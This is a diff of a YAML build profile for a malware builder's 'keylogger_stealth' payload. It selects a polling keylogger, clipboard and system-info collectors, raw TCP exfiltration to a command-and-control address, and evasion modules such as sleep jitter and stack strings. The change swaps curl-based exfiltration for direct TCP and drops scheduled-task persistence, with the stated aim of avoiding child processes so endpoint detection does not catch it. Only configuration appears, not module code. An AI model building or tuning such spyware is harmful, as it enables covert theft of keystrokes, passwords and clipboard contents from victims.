@@ -1,17 +1,16 @@
 name: keylogger_stealth
-description: EDR-evasive keylogger — poll-based, LOLBin exfil, pacing, persistence
+description: EDR-evasive keylogger — zero child processes, 4 evasion layers, no persist
 
 core:
   - core/emit_buffer
-  - core/run_cmd
 
 collectors:
-  - collectors/system_info_stealth
+  - collectors/system_info_api
   - collectors/clipboard
 
 keylogger: collectors/keylogger_poll
 
-exfil: exfil/curl_lolbin
+exfil: exfil/tcp_flush
 arch: arch/keylogger
 
 evasion:
@@ -19,8 +18,6 @@ evasion:
   - evasion/sleep_jitter
   - evasion/triggered_exec
   - evasion/stack_strings
-
-persist: persist/scheduled_task
 
 vars:
   C2_IP: "10.0.2.2"
